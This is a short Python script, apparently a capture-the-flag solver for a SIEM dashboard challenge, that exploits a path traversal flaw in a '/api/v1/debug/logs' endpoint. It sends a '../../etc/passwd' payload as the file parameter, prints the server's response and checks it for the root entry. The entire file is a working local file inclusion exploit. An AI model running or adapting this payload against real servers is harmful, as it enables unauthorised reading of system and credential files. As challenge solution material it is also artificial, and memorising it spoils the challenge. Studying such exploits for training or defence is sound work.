#!/usr/bin/env python3
import requests
import sys

def solve(target_url):
    print(f"[*] Targeting SIEM Dashboard at: {target_url}")
    
    # The vulnerability is in the /api/v1/debug/logs endpoint
    # We will exploit it using a classic Path Traversal LFI
    vuln_endpoint = f"{target_url}/api/v1/debug/logs"
    
    # Payload targeting /etc/passwd
    payload = "../../../../../../../../../../etc/passwd"
    
    print(f"[*] Sending payload: {payload}")
    
    try:
        response = requests.get(vuln_endpoint, params={"file": payload}, timeout=5)
        
        if response.status_code == 200:
            print("[+] Exploit successful! Server responded with:")
            print("-" * 40)
            print(response.text[:500] + "\n...[truncated]..." if len(response.text) > 500 else response.text)
            print("-" * 40)
            
            # Check for standard root entry in /etc/passwd
            if "root:x:0:0:" in response.text:
                print("[+] Verified /etc/passwd contents.")
                return True
            else:
                print("[-] Retrieved file doesn't look like /etc/passwd. Verification failed.")
        else:
            print(f"[-] Exploit failed. Status Code: {response.status_code}")
            
    except requests.exceptions.RequestException as e:
        print(f"[-] Connection error: {e}")
        
    return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python solve_siem.py <http://target_ip:port>")
        print("Example: python solve_siem.py http://127.0.0.1:8080")
        sys.exit(1)
        
    target = sys.argv[1].rstrip('/')
    if solve(target):
        print("\n[+] Solving Complete.")
        sys.exit(0)
    else:
        print("\n[-] Solving Failed.")
        sys.exit(1)
